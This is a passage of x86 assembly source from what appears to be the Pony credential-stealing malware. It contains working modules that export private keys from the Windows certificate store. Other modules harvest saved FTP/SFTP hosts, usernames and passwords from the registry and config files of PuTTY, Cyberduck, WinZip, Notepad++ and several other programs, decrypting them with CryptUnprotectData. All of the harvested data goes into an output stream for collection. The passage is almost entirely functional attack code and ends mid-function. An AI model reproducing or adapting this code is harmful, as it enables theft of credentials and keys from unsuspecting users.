	    SignatureAlgorithm     	CRYPT_ALGORITHM_IDENTIFIER <>
	    Issuer              	CRYPT_BLOB <>
	    NotBefore           	FILETIME <>
	    NotAfter            	FILETIME <>
	    Subject                	CRYPT_BLOB <>
	    SubjectPublicKeyInfo   	CERT_PUBLIC_KEY_INFO <>
	    IssuerUniqueId         	CRYPT_BIT_BLOB <>
	    SubjectUniqueId        	CRYPT_BIT_BLOB <>
	    cExtension             	dd	?
	    rgExtension            	dd	?
	CERT_INFO ends

.code

GrabCert proc uses esi edi stream
	LOCAL	hdr_ofs: DWORD
	LOCAL	hStore: DWORD
	LOCAL	nExtensions: DWORD
	LOCAL	ExtensionStr: DWORD
	LOCAL	hProv: DWORD
	LOCAL	dwKeySpec: DWORD
	LOCAL	hUserKey: DWORD
	LOCAL	dwBlobLen: DWORD
	LOCAL	Blob: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_CERT, 0
	mov	hdr_ofs, eax

	.IF	MyCertOpenSystemStore && MyCertEnumCertificatesInStore && MyCryptAcquireCertificatePrivateKey && MyCryptGetUserKey && MyCryptExportKey && MyCryptDestroyKey && MyCryptReleaseContext && MyCertCloseStore
		push	offset CMyCert
		push	0
		call	MyCertOpenSystemStore 
		mov	hStore, eax
		.IF	hStore != NULL
			sub	esi, esi
			.WHILE	TRUE
				push	esi
				push	hStore
				call	MyCertEnumCertificatesInStore
				mov	esi, eax
	
				.IF	!esi
					.BREAK
				.ENDIF
	
				mov	edx, dword ptr[esi].CERT_CONTEXT.pCertInfo
				mov	ecx, [edx].CERT_INFO.cExtension
				mov	edi, [edx].CERT_INFO.rgExtension
				mov	nExtensions, ecx
	
				.IF	edi
					.WHILE	nExtensions
						invoke	lstrcmp, [edi].CERT_EXTENSION.pszObjId, offset CCertObjId
						.IF	!eax && [edi].CERT_EXTENSION.Value.cbData
							invoke	MemAlloc, [edi].CERT_EXTENSION.Value.cbData
							mov	ExtensionStr, eax
							invoke	MoveMem, [edi].CERT_EXTENSION.Value.pbData, ExtensionStr, [edi].CERT_EXTENSION.Value.cbData
							invoke	lstrcmp, ExtensionStr, offset CCertSignUsage
							.IF	!eax
								push	NULL
								lea	eax, dwKeySpec
								push	eax
								lea	eax, hProv
								push	eax
								push	NULL
								push	0
								push	esi
								call	MyCryptAcquireCertificatePrivateKey
								.IF	eax
									lea	eax, hUserKey
									push	eax
									push	dwKeySpec
									push	hProv
									call	MyCryptGetUserKey
									.IF	eax
										lea	eax, dwBlobLen
										push	eax
										push	NULL
										push	0
										push	PRIVATEKEYBLOB
										push	0
										push	hUserKey
										call	MyCryptExportKey 
										.IF	eax
											invoke	MemAlloc, dwBlobLen
											mov	Blob, eax
											
											lea	eax, dwBlobLen
											push	eax
											push	Blob
											push	0
											push	PRIVATEKEYBLOB
											push	0
											push	hUserKey
											call	MyCryptExportKey 
											.IF	eax
												invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 0
												invoke	StreamWriteBinaryString, stream, dword ptr[esi].CERT_CONTEXT.pbCertEncoded, dword ptr[esi].CERT_CONTEXT.cbCertEncoded
												invoke	StreamWriteBinaryString, stream, Blob, dwBlobLen
											.ENDIF
											
											invoke	MemFree, Blob
										.ENDIF
										push	hUserKey
										call	MyCryptDestroyKey
									.ENDIF
									push	0
									push	hProv
									call	MyCryptReleaseContext
								.ENDIF
							.ENDIF
							invoke	MemFree, ExtensionStr
						.ENDIF
						add	edi, sizeof CERT_EXTENSION
						dec	nExtensions
					.ENDW
				.ENDIF
			.ENDW
			push	0
			push	hStore
			call	MyCertCloseStore
		.ENDIF
	.ENDIF
	
	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabCert endp

ENDIF

IFDEF COMPILE_MODULE_LINASFTP

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; LinasFTP
; Tested: v0.43 beta
; SFTP: not supported

.data
	CLinasFTPRegPath	db	'Software\LinasFTP\Site Manager',0
	CLinasFTPHostValue	db	'Host',0
	CLinasFTPUserValue	db	'User',0
	CLinasFTPPassValue	db	'Pass',0
	CLinasFTPPortValue	db	'Port',0
	CLinasFTPDirValue	db	'Remote Dir',0

.code

LinasFTPScanReg proc stream, BasePath
	LOCAL	hkHandle: DWORD
	LOCAL	KeyIndex: DWORD
	LOCAL	dwBufLen: DWORD
	LOCAL	lpBuf[2048]: BYTE
	LOCAL	Host: DWORD
	LOCAL	User: DWORD
	LOCAL	Password: DWORD
	LOCAL	Port: DWORD
	LOCAL	Dir: DWORD
	LOCAL	S: DWORD
	
	invoke	RegOpenKey, dwCurrentUserKey, BasePath, addr hkHandle
	.IF	!eax
		mov	KeyIndex, 0
		.WHILE	TRUE
			mov	dwBufLen, 2047
			invoke	RegEnumKeyEx, hkHandle, KeyIndex, addr lpBuf, addr dwBufLen, NULL, NULL, NULL, NULL
			.IF	eax
				.BREAK
			.ENDIF
			
			invoke	PonyStrCat, BasePath, addr szSlash
			push	eax
			mov	edx, eax
			invoke	PonyStrCat, edx, addr lpBuf
			mov	S, eax
			call	MemFree
			
			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CLinasFTPHostValue, NULL
			mov	Host, eax

			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CLinasFTPUserValue, NULL
			mov	User, eax

			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CLinasFTPPassValue, NULL
			mov	Password, eax

			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CLinasFTPPortValue, NULL
			mov	Port, eax

			invoke	RegReadValueStr, dwCurrentUserKey, S, addr CLinasFTPDirValue, NULL
			mov	Dir, eax
			
			.IF	User
				; export data, type = 0000: Host | User | Pass | Port | Dir
				invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 0
				invoke	StreamWriteString, stream, Host
				invoke	StreamWriteString, stream, User
				invoke	StreamWriteString, stream, Password
				invoke	StreamWriteString, stream, Port
				invoke	StreamWriteString, stream, Dir
			.ENDIF
			
			; recursively scan subfolders
			invoke	LinasFTPScanReg, stream, S			
			invoke	MemFree, S
			
			invoke	MemFree, Host
			invoke	MemFree, User
			invoke	MemFree, Password
			invoke	MemFree, Port
			invoke	MemFree, Dir
			
			inc	KeyIndex			
		.ENDW
		invoke	RegCloseKey, hkHandle
	.ENDIF
	ret
LinasFTPScanReg endp

GrabLinasFTP proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_LINASFTP, 0
	mov	hdr_ofs, eax
	
	invoke	LinasFTPScanReg, stream, offset CLinasFTPRegPath
	
	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	
	ret
GrabLinasFTP endp

ENDIF

IFDEF COMPILE_MODULE_CYBERDUCK

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Cyberduck
; http://cyberduck.ch/
; Tested: v4.1.3 (9045)
; Tested: v4.2.1 (9350)
; SFTP: implemented

.data
	CCyberduckAppDataDir		db	'\Cyberduck',0
	CCyberduckDuckFile		db	'.duck',0
	CCyberduckConfigFile		db	'user.config',0
	CCyberduckXmlNameStart		db	'<setting name="',0
	CCyberduckXmlEnd		db	'"',0
	CCyberduckXmlPassStart		db	'value="',0

.code

CyberduckDecryptPass proc stream, url, pass
	LOCAL	decoded_pass: DWORD
	LOCAL	pass_len: DWORD
	LOCAL	decoded_len: DWORD
	
	invoke	lstrlen, url
	.IF	!eax
		ret
	.ENDIF
	
	invoke	lstrlen, pass
	.IF	!eax
		ret
	.ENDIF
	mov	pass_len, eax
	
	invoke	MemAlloc, pass_len
	mov	decoded_pass, eax
	
	invoke	Base64Decode, pass, pass_len, decoded_pass
	.IF	eax
		mov	decoded_len, eax
		invoke	CommonCryptUnprotectData, decoded_pass, addr decoded_len, NULL
		.IF	eax
			; Export crypted-decrypted password pair
			invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 1000h
			invoke	StreamWriteString, stream, url
			invoke	StreamWriteBinaryString, stream, decoded_pass, decoded_len
		.ENDIF
	.ENDIF
	
	invoke	MemFree, decoded_pass
	
	ret
CyberduckDecryptPass endp

CyberduckProcessConfigFile proc uses esi stream, FilePath, item_id
	LOCAL	map: MappedFile
	LOCAL	xml_str: DWORD
	LOCAL	xml_name_start: DWORD
	LOCAL	xml_name_end: DWORD
	LOCAL	xml_name_end_char: BYTE
	LOCAL	xml_pass_start: DWORD
	LOCAL	xml_pass_end: DWORD
	LOCAL	xml_pass_end_char: BYTE

	invoke	FileExists, FilePath
	.IF	!eax
		ret
	.ENDIF
	
	invoke	MapFile, FilePath, addr map
	.IF	eax
		invoke	MemAlloc, map.dwFileSize
		mov	xml_str, eax
		
		invoke	MoveMem, map.lpMem, xml_str, map.dwFileSize
		mov	esi, xml_str
		
		.WHILE	byte ptr[esi]
			; Find name value
			invoke	StrStr, esi, offset CCyberduckXmlNameStart
			.IF	!eax
				.BREAK
			.ENDIF
			mov	esi, eax
			invoke	lstrlen, offset CCyberduckXmlNameStart
			add	esi, eax
			mov	xml_name_start, esi
			invoke	StrStr, esi, offset CCyberduckXmlEnd
			.IF	!eax
				.BREAK
			.ENDIF
			
			mov	dl, byte ptr[eax]
			mov	xml_name_end_char, dl
			mov	xml_name_end, eax
			
			; Find password value
			invoke	StrStr, esi, offset CCyberduckXmlPassStart
			.IF	!eax
				.BREAK
			.ENDIF
			mov	esi, eax
			invoke	lstrlen, offset CCyberduckXmlPassStart
			add	esi, eax
			mov	xml_pass_start, esi
			
			invoke	StrStr, esi, offset CCyberduckXmlEnd
			.IF	!eax
				.BREAK
			.ENDIF
			
			mov	dl, byte ptr[eax]
			mov	xml_pass_end_char, dl
			mov	xml_pass_end, eax
			
			; Cut required strings
			mov	eax, xml_name_end
			mov	byte ptr[eax], 0 
			
			mov	eax, xml_pass_end
			mov	byte ptr[eax], 0
			
			; Decrypt & write password to output stream
			invoke	CyberduckDecryptPass, stream, xml_name_start, xml_pass_start
			
			; Recover ovewritten data
			mov	dl, xml_name_end_char
			mov	eax, xml_name_end
			mov	byte ptr[eax], dl
			
			mov	dl, xml_pass_end_char
			mov	eax, xml_pass_end
			mov	byte ptr[eax], dl			
		.ENDW
		
		invoke	MemFree, xml_str
		invoke	UnmapFile, addr map
	.ELSE
	.ENDIF

	ret
CyberduckProcessConfigFile endp

FindCyberduckConfigs proc stream, appdata_csidl
	invoke	SHGetFolderPathStr, appdata_csidl
	.IF	eax
		invoke	PonyStrCatFreeArg1, eax, offset CCyberduckAppDataDir 
		push	eax
		invoke	CommonFileScanCallback, stream, eax, offset CCyberduckConfigFile, ITEMHDR_ID or 0, offset CyberduckProcessConfigFile
		call	MemFree
	.ENDIF	

	ret
FindCyberduckConfigs endp

GrabCyberduck proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_CYBERDUCK, 0
	mov	hdr_ofs, eax
	
	invoke	FindCyberduckConfigs, stream, CSIDL_APPDATA
	invoke	FindCyberduckConfigs, stream, CSIDL_COMMON_APPDATA
	invoke	FindCyberduckConfigs, stream, CSIDL_LOCAL_APPDATA
	
	invoke	AppDataCommonFileScan, stream, offset CCyberduckAppDataDir, offset CCyberduckDuckFile, ITEMHDR_ID or 0
	
	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	
	ret
GrabCyberduck endp

ENDIF

IFDEF COMPILE_MODULE_PUTTY

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Putty (Russian version)
; http://putty.org.ru/
; Tested: 0.61-RU-8
; SFTP: implemented

.data
	CPuttyBaseRegPath	db	'Software\SimonTatham\PuTTY\Sessions',0
	CPuttyHostName		db	'HostName',0
	CPuttyUserName		db	'UserName',0
	CPuttyPassword		db	'Password',0
	CPuttyPort		db	'PortNumber',0
	CPuttyTermType		db	'TerminalType',0

.code

PuttyGrabPassword proc reg_key, BasePath, stream
	LOCAL	hkHandle: DWORD
	LOCAL	KeyIndex: DWORD
	LOCAL	dwBufLen: DWORD
	LOCAL	lpBuf[2048]: BYTE
	LOCAL	Host: DWORD
	LOCAL	User: DWORD
	LOCAL	Password: DWORD
	LOCAL	Port: DWORD
	LOCAL	TermType: DWORD
	LOCAL	dwPortLen: DWORD
	LOCAL	S: DWORD
	
	invoke	RegOpenKey, reg_key, BasePath, addr hkHandle
	.IF	!eax
		mov	KeyIndex, 0
		.WHILE	TRUE
			mov	dwBufLen, 2047
			invoke	RegEnumKeyEx, hkHandle, KeyIndex, addr lpBuf, addr dwBufLen, NULL, NULL, NULL, NULL
			.IF	eax
				.BREAK
			.ENDIF
			
			invoke	PonyStrCat, BasePath, addr szSlash
			push	eax
			mov	edx, eax
			invoke	PonyStrCat, edx, addr lpBuf
			mov	S, eax
			call	MemFree
			
			invoke	RegReadValueStr, reg_key, S, addr CPuttyHostName, NULL
			mov	Host, eax

			invoke	RegReadValueStr, reg_key, S, addr CPuttyUserName, NULL
			mov	User, eax

			invoke	RegReadValueStr, reg_key, S, addr CPuttyPassword, NULL
			mov	Password, eax

			invoke	RegReadValueStr, reg_key, S, addr CPuttyPort, addr dwPortLen
			mov	Port, eax
			
			invoke	RegReadValueStr, reg_key, S, addr CPuttyTermType, NULL
			mov	TermType, eax			

			.IF	Host && User && Password
				; export data, type = 0000: Host | User | Pass | Port | TermType
				invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 0
				invoke	StreamWriteString, stream, Host
				invoke	StreamWriteString, stream, User
				invoke	StreamWriteString, stream, Password
				invoke	StreamWriteBinaryString, stream, Port, dwPortLen
				invoke	StreamWriteString, stream, TermType
			.ENDIF
			
			; recursively scan subfolders
			invoke	PuttyGrabPassword, reg_key, S, stream			
			invoke	MemFree, S
			
			invoke	MemFree, Host
			invoke	MemFree, User
			invoke	MemFree, Password
			invoke	MemFree, Port
			invoke	MemFree, TermType
			
			inc	KeyIndex			
		.ENDW
		invoke	RegCloseKey, hkHandle
	.ENDIF
	ret
PuttyGrabPassword endp

GrabPutty proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_PUTTY, 0
	mov	hdr_ofs, eax
	
	invoke	PuttyGrabPassword, dwCurrentUserKey, offset CPuttyBaseRegPath, stream
	invoke	PuttyGrabPassword, HKEY_LOCAL_MACHINE, offset CPuttyBaseRegPath, stream
	
	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabPutty endp

ENDIF

IFDEF COMPILE_MODULE_NOTEPADPP

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Notepad++ (NppFTP plugin)
; http://notepad-plus-plus.org/
; Tested: 0.24.1
; SFTP: implemented

.data
	CNotepadFTPXmlFile	db	'NppFTP.xml',0
	CNotepadAppDataDir	db	'\Notepad++',0

.code

GrabNotepadPP proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_NOTEPADPP, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CNotepadAppDataDir, offset CNotepadFTPXmlFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabNotepadPP endp

ENDIF

IFDEF COMPILE_MODULE_VS_DESIGNER

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; CoffeeCup Visual Site Designer
; http://www.coffeecup.com/designer/
; Tested: 7.0, Build 24
; SFTP: not supported

.data
	CVSDesignerRegPath		db	'Software\CoffeeCup Software',0
	CVSDesignerHostName		db	'FTP destination server',0
	CVSDesignerUserName		db	'FTP destination user',0
	CVSDesignerPassword		db	'FTP destination password',0
	CVSDesignerPort			db	'FTP destination port',0
	CVSDesignerDir			db	'FTP destination catalog',0
	CVSDesignerProfiles		db	'FTP profiles',0

.code

VSDesignerScanReg proc reg_key, BasePath, stream
	LOCAL	hkHandle: DWORD
	LOCAL	KeyIndex: DWORD
	LOCAL	dwBufLen: DWORD
	LOCAL	lpBuf[2048]: BYTE
	LOCAL	Host: DWORD
	LOCAL	User: DWORD
	LOCAL	Password: DWORD
	LOCAL	Port: DWORD
	LOCAL	Dir: DWORD
	LOCAL	dwPortLen: DWORD
	LOCAL	S: DWORD
	LOCAL	Profiles: DWORD
	LOCAL	dwProfilesLen: DWORD
	
	invoke	RegOpenKey, reg_key, BasePath, addr hkHandle
	.IF	!eax
		mov	KeyIndex, 0
		.WHILE	TRUE
			mov	dwBufLen, 2047
			invoke	RegEnumKeyEx, hkHandle, KeyIndex, addr lpBuf, addr dwBufLen, NULL, NULL, NULL, NULL
			.IF	eax
				.BREAK
			.ENDIF
			
			invoke	PonyStrCat, BasePath, addr szSlash
			push	eax
			mov	edx, eax
			invoke	PonyStrCat, edx, addr lpBuf
			mov	S, eax
			call	MemFree
			
			invoke	RegReadValueStr, reg_key, S, addr CVSDesignerHostName, NULL
			mov	Host, eax

			invoke	RegReadValueStr, reg_key, S, addr CVSDesignerUserName, NULL
			mov	User, eax

			invoke	RegReadValueStr, reg_key, S, addr CVSDesignerPassword, NULL
			mov	Password, eax

			invoke	RegReadValueStr, reg_key, S, addr CVSDesignerPort, addr dwPortLen
			mov	Port, eax
			
			invoke	RegReadValueStr, reg_key, S, addr CVSDesignerDir, NULL
			mov	Dir, eax			

			invoke	RegReadValueStr, reg_key, S, addr CVSDesignerProfiles, addr dwProfilesLen
			mov	Profiles, eax			

			.IF	Host && User && Password
				; export data, type = 0000: Host | User | Pass | Port | Dir
				invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 0
				invoke	StreamWriteString, stream, Host
				invoke	StreamWriteString, stream, User
				invoke	StreamWriteString, stream, Password
				invoke	StreamWriteBinaryString, stream, Port, dwPortLen
				invoke	StreamWriteString, stream, Dir
			.ENDIF

			.IF	dwProfilesLen
				; export data, type = 0001: Profile binary data
				invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 1
				invoke	StreamWriteBinaryString, stream, Profiles, dwProfilesLen
			.ENDIF
			
			; recursively scan subfolders
			invoke	VSDesignerScanReg, reg_key, S, stream			
			invoke	MemFree, S
			
			invoke	MemFree, Host
			invoke	MemFree, User
			invoke	MemFree, Password
			invoke	MemFree, Port
			invoke	MemFree, Dir
			invoke	MemFree, Profiles
			
			inc	KeyIndex			
		.ENDW
		invoke	RegCloseKey, hkHandle
	.ENDIF
	ret
VSDesignerScanReg endp

GrabVSDesigner proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_VS_DESIGNER, 0
	mov	hdr_ofs, eax

	invoke	VSDesignerScanReg, dwCurrentUserKey, offset CVSDesignerRegPath, stream
	invoke	VSDesignerScanReg, HKEY_LOCAL_MACHINE, offset CVSDesignerRegPath, stream
	
	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabVSDesigner endp

ENDIF

IFDEF COMPILE_MODULE_FTPSHELL

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; FTPShell
; http://www.ftpshell.com/
; Tested: Version 5.24
; SFTP: not supported

.data
	CFTPShellInstName	db	'FTPShell',0
	CFTPShellConfigFile	db	'ftpshell.fsi',0

.code

GrabFTPShell proc uses esi edi stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_FTPSHELL, 0
	mov	hdr_ofs, eax

	mov	esi, lpInstalledList
	mov	edi, lpInstalledNames
	.IF	byte ptr[edi]
	@n:
		invoke	StrStrI, edi, offset CFTPShellInstName
		.IF	eax
			invoke	ExtractFilePath, esi
			push	eax
			invoke	CommonFileScan, stream, eax, offset CFTPShellConfigFile, ITEMHDR_ID or 0 
			call	MemFree
		.ENDIF
		.WHILE	byte ptr[esi]
			inc	esi
		.ENDW
		inc	esi
		@Next	@n
	.ENDIF

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabFTPShell endp

ENDIF

IFDEF COMPILE_MODULE_FTPINFO

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; FTPInfo
; http://www.ftpinfo.ru/
; Tested: 2.0.0 beta 27
; SFTP: not supported

.data
	CFTPInfoRegPath		db	'Software\MAS-Soft\FTPInfo\Setup',0
	CFTPInfoRegDirValue	db	'DataDir',0
	CFTPInfoAppDataDir	db	'\FTPInfo',0
	CFTPInfoConfigFile	db	'ServerList.xml',0

.code

GrabFTPInfo proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_FTPINFO, 0
	mov	hdr_ofs, eax

	invoke	RegReadValueStr, dwCurrentUserKey, offset CFTPInfoRegPath, offset CFTPInfoRegDirValue, NULL
	.IF	eax
		push	eax
		invoke	CommonFileScan, stream, eax, offset CFTPInfoConfigFile, ITEMHDR_ID or 0 
		call	MemFree
	.ENDIF

	invoke	AppDataCommonFileScan, stream, offset CFTPInfoAppDataDir, offset CFTPInfoConfigFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret		
GrabFTPInfo endp

ENDIF               

IFDEF COMPILE_MODULE_NEXUSFILE

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; NexusFile
; http://www.xiles.net/nexusfile/
; Tested: 5.3.1.5460 (2011.06.05)
; SFTP: implemented

.data
	CNexusFileInstName		db	'NexusFile',0
	CNexusFileConfigFile	db	'ftpsite.ini',0

.code

GrabNexusFile proc uses esi edi stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_NEXUSFILE, 0
	mov	hdr_ofs, eax

	mov	esi, lpInstalledList
	mov	edi, lpInstalledNames
	.IF	byte ptr[edi]
	@n:
		invoke	StrStrI, edi, offset CNexusFileInstName
		.IF	eax
			invoke	ExtractFilePath, esi
			push	eax
			invoke	CommonFileScan, stream, eax, offset CNexusFileConfigFile, ITEMHDR_ID or 0 
			call	MemFree
		.ENDIF
		.WHILE	byte ptr[esi]
			inc	esi
		.ENDW
		inc	esi
		@Next	@n
	.ENDIF

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabNexusFile endp

ENDIF

IFDEF COMPILE_MODULE_FS_BROWSER

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; FastStone Browser
; http://www.faststone.org/
; Tested: 1.3
; SFTP: not supported

.data
	CFSBrowserInstName	db	'FastStone Browser',0
	CFSBrowerConfigFile	db	'FTPList.db',0

.code

GrabFSBrowser proc uses esi edi stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_FS_BROWSER, 0
	mov	hdr_ofs, eax

	mov	esi, lpInstalledList
	mov	edi, lpInstalledNames
	.IF	byte ptr[edi]
	@n:
		invoke	StrStrI, edi, offset CFSBrowserInstName
		.IF	eax
			invoke	ExtractFilePath, esi
			push	eax
			invoke	CommonFileScan, stream, eax, offset CFSBrowerConfigFile, ITEMHDR_ID or 0 
			call	MemFree
		.ENDIF
		.WHILE	byte ptr[esi]
			inc	esi
		.ENDW
		inc	esi
		@Next	@n
	.ENDIF

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabFSBrowser endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; CoolNovo
; http://coolnovo.com/
; Tested: 2.0.2.26
; SFTP: not supported

IFDEF COMPILE_MODULE_COOLNOVO

.data
	CCoolNovoAppDataDir	db	'\MapleStudio\ChromePlus',0

.code

GrabCoolNovo proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_COOLNOVO, 0
	mov	hdr_ofs, eax

	invoke	ChromeCommonScan, stream, offset CCoolNovoAppDataDir

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabCoolNovo endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; WinZip (built-in FTP backup settings)
; http://winzip.com/
; Tested: 16.0 Pro (9661)
; SFTP: not supported

IFDEF COMPILE_MODULE_WINZIP

.data
	CWinZipFTPRegPath	db	'Software\Nico Mak Computing\WinZip\FTP',0
	CWinZipJobRegPath	db	'Software\Nico Mak Computing\WinZip\mru\jobs',0
	CWinZipHostName		db	'Site',0
	CWinZipUserName		db	'UserID',0
	CWinZipPassword		db	'xflags',0
	CWinZipPort			db	'Port',0
	CWinZipDir			db	'Folder',0
	CWinZipJobExt		db	'.wjf',0
	CWinZipPassStart	db	'winex="',0
	CWinZipPassEnd		db	'"/>',0

.code

WinZipProcessWJFFile proc uses esi stream, szFileName
	LOCAL	map: MappedFile
	LOCAL	xml_str: DWORD
	LOCAL	xml_pass_start: DWORD
	LOCAL	pass_len: DWORD
	LOCAL	pass: DWORD

	invoke	FileExists, szFileName
	.IF	!eax
		ret
	.ENDIF
	
	invoke	MapFile, szFileName, addr map
	.IF	eax
		invoke	MemAlloc, map.dwFileSize
		mov	xml_str, eax
		
		invoke	MoveMem, map.lpMem, xml_str, map.dwFileSize
		mov	esi, xml_str
		
		.WHILE	byte ptr[esi]
			invoke	StrStr, esi, offset CWinZipPassStart
			.IF	!eax
				.BREAK
			.ENDIF
			mov	esi, eax
			invoke	lstrlen, offset CWinZipPassStart
			add	esi, eax
			mov	xml_pass_start, esi
			invoke	StrStr, esi, offset CWinZipPassEnd
			.IF	!eax
				.BREAK
			.ENDIF
			mov	dl, byte ptr[eax]
			mov	byte ptr[eax], 0
			
			push	eax
			push	edx
			
			invoke	lstrlen, xml_pass_start
			.IF	eax
				mov	pass_len, eax
				
				invoke	lstrdup, xml_pass_start
				mov	pass, eax
				
				invoke	DecodeHexString, pass, pass_len
				.IF	eax
					shr	pass_len, 1
					invoke	CommonCryptUnprotectData, pass, addr pass_len, NULL
					.IF	eax
						; Write encrypted-decrypted password pair
						invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 1
						invoke	StreamWriteString, stream, xml_pass_start
						invoke	StreamWriteBinaryString, stream, pass, pass_len
					.ENDIF
				.ENDIF
				
				invoke	MemFree, pass
			.ENDIF
			
			pop	edx
			pop	eax
			
			mov	byte ptr[eax], dl
		.ENDW
		
		; Export wjf file
		invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 2
		invoke	StreamWriteBinaryString, stream, xml_str, map.dwFileSize
		
		invoke	MemFree, xml_str
		invoke	UnmapFile, addr map
	.ELSE
	.ENDIF
	
	ret
WinZipProcessWJFFile endp

WinZipGrabRegPassword proc reg_key, BasePath, stream
	LOCAL	hkHandle: DWORD
	LOCAL	Host: DWORD
	LOCAL	User: DWORD
	LOCAL	Password: DWORD
	LOCAL	Port: DWORD
	LOCAL	Dir: DWORD
	LOCAL	dwPasswordLen: DWORD
	
	invoke	RegOpenKey, reg_key, BasePath, addr hkHandle
	.IF	!eax
		invoke	RegReadValueStr, reg_key, BasePath, addr CWinZipHostName, NULL
		mov	Host, eax

		invoke	RegReadValueStr, reg_key, BasePath, addr CWinZipUserName, NULL
		mov	User, eax

		invoke	RegReadValueStr, reg_key, BasePath, addr CWinZipPassword, addr dwPasswordLen
		mov	Password, eax

		invoke	RegReadValueStr, reg_key, BasePath, addr CWinZipPort, NULL
		mov	Port, eax
		
		invoke	RegReadValueStr, reg_key, BasePath, addr CWinZipDir, NULL
		mov	Dir, eax
		
		.IF	Password && dwPasswordLen
			invoke	DecodeHexString, Password, dwPasswordLen
			.IF	eax
				shr	dwPasswordLen, 1
				invoke	CommonCryptUnprotectData, Password, addr dwPasswordLen, NULL
				.IF	eax && Host && User && Password
					; export data, type = 0000: Host | User | Pass | Port | Folder
					invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 0
					invoke	StreamWriteString, stream, Host
					invoke	StreamWriteString, stream, User
					invoke	StreamWriteBinaryString, stream, Password, dwPasswordLen
					invoke	StreamWriteString, stream, Port
					invoke	StreamWriteString, stream, Dir
				.ENDIF
			.ENDIF
		.ENDIF
		
		invoke	MemFree, Host
		invoke	MemFree, User
